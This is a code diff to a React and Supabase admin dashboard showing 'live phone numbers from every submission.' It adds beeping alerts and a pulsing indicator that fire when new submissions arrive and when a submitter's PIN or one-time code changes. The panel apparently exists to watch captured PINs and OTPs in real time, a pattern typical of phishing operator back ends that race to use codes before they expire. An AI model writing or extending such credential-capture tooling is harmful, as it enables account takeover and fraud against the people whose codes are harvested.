@@ -1,6 +1,6 @@
 import React, { useEffect, useRef, useState } from 'react';
 import { supabase } from '../supabaseClient';
-import { normalizeApplicationRecord } from '../utils/supabaseCompat';
+import { derivePinAndOtpFromRecord, normalizeApplicationRecord } from '../utils/supabaseCompat';
 import {
   createViewerLinkInSupabase,
   fetchApplicationsFromSupabase,
@@ -59,7 +59,11 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
   const [exactExpiry, setExactExpiry] = useState('');
   const [createdLink, setCreatedLink] = useState<string | null>(null);
   const [isCreatingLink, setIsCreatingLink] = useState(false);
+  const [notificationPulse, setNotificationPulse] = useState(false);
   const channelRef = useRef<any>(null);
+  const audioContextRef = useRef<AudioContext | null>(null);
+  const notificationTimeoutRef = useRef<number | null>(null);
+  const applicationsRef = useRef<ApplicationRecord[]>([]);
 
   const getAuthHeaders = async () => {
     const headers: Record<string, string> = { 'Content-Type': 'application/json' };
@@ -124,6 +128,76 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
     });
   };
 
+  const getAudioContext = () => {
+    if (audioContextRef.current) {
+      return audioContextRef.current;
+    }
+
+    const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+    if (!AudioCtx) {
+      return null;
+    }
+
+    audioContextRef.current = new AudioCtx();
+    return audioContextRef.current;
+  };
+
+  const playBeeps = async (count: number) => {
+    const context = getAudioContext();
+    if (!context || count < 1) {
+      return;
+    }
+
+    try {
+      if (context.state === 'suspended') {
+        await context.resume();
+      }
+    } catch {
+      return;
+    }
+
+    const now = context.currentTime;
+    const beepDuration = 0.12;
+    const gap = 0.16;
+    const oscillator = context.createOscillator();
+    const gain = context.createGain();
+
+    oscillator.type = 'sine';
+    oscillator.frequency.value = 880;
+    gain.gain.value = 0;
+    gain.connect(context.destination);
+    oscillator.connect(gain);
+    oscillator.start(now);
+
+    for (let index = 0; index < count; index += 1) {
+      const startTime = now + index * (beepDuration + gap);
+      const endTime = startTime + beepDuration;
+      gain.gain.setValueAtTime(0, startTime);
+      gain.gain.linearRampToValueAtTime(0.26, startTime + 0.01);
+      gain.gain.setValueAtTime(0.26, endTime - 0.02);
+      gain.gain.linearRampToValueAtTime(0, endTime);
+    }
+
+    oscillator.stop(now + count * (beepDuration + gap));
+    oscillator.onended = () => {
+      oscillator.disconnect();
+      gain.disconnect();
+    };
+  };
+
+  const triggerRealtimeNotification = (beepCount: number) => {
+    setNotificationPulse(true);
+    if (notificationTimeoutRef.current) {
+      window.clearTimeout(notificationTimeoutRef.current);
+    }
+    notificationTimeoutRef.current = window.setTimeout(() => {
+      setNotificationPulse(false);
+      notificationTimeoutRef.current = null;
+    }, 420);
+
+    void playBeeps(beepCount);
+  };
+
   const connectRealtime = async () => {
     if (channelRef.current) {
       try {
@@ -146,6 +220,7 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
       .channel('admin-dashboard-realtime')
       .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'applications' }, (payload: any) => {
         const normalized = normalizeApplicationRecord(payload.new as Record<string, any>);
+        triggerRealtimeNotification(3);
         setApplications((current) => {
           const existingIndex = current.findIndex((item) => item.id === normalized.id);
           const next = existingIndex >= 0
@@ -160,6 +235,27 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
       })
       .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'applications' }, (payload: any) => {
         const normalized = normalizeApplicationRecord(payload.new as Record<string, any>);
+        const oldRecord = (payload.old as Record<string, any>) || {};
+        const newRecord = payload.new as Record<string, any>;
+        const existingApp = applicationsRef.current.find((item) => item.id === normalized.id);
+
+        const oldPin = payload.old
+          ? derivePinAndOtpFromRecord(oldRecord).pin
+          : existingApp?.pin ?? '';
+        const oldOtp = payload.old
+          ? derivePinAndOtpFromRecord(oldRecord).otp
+          : existingApp?.otp ?? '';
+        const newPin = derivePinAndOtpFromRecord(newRecord).pin;
+        const newOtp = derivePinAndOtpFromRecord(newRecord).otp;
+
+        const pinChanged = oldPin !== newPin;
+        const otpChanged = oldOtp !== newOtp;
+        if (pinChanged) {
+          triggerRealtimeNotification(2);
+        } else if (otpChanged) {
+          triggerRealtimeNotification(1);
+        }
+
         setApplications((current) => {
           const existingIndex = current.findIndex((item) => item.id === normalized.id);
           const next = existingIndex >= 0
@@ -250,9 +346,16 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
           // ignore
         }
       }
+      if (notificationTimeoutRef.current) {
+        window.clearTimeout(notificationTimeoutRef.current);
+      }
     };
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
+
+  useEffect(() => {
+    applicationsRef.current = applications;
+  }, [applications]);
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -367,7 +470,10 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
           <h1 className="mt-3 text-2xl font-semibold text-slate-900">Admin dashboard</h1>
           <p className="mt-2 text-sm text-slate-500">Live phone numbers from every submission.</p>
         </div>
-        <div className="rounded-full bg-slate-100 px-4 py-2 text-sm font-medium text-slate-600">Realtime-ready</div>
+        <div className="flex items-center gap-2 rounded-full bg-slate-100 px-4 py-2 text-sm font-medium text-slate-600">
+          <span className={`h-2.5 w-2.5 rounded-full bg-emerald-500 transition-all duration-200 ${notificationPulse ? 'opacity-100 scale-110' : 'opacity-0 scale-75'}`} />
+          <span>Realtime-ready</span>
+        </div>
       </div>
 
       {error ? <div className="mt-6 rounded-2xl border border-red-200 bg-red-50 p-3 text-sm text-red-700">{error}</div> : null}
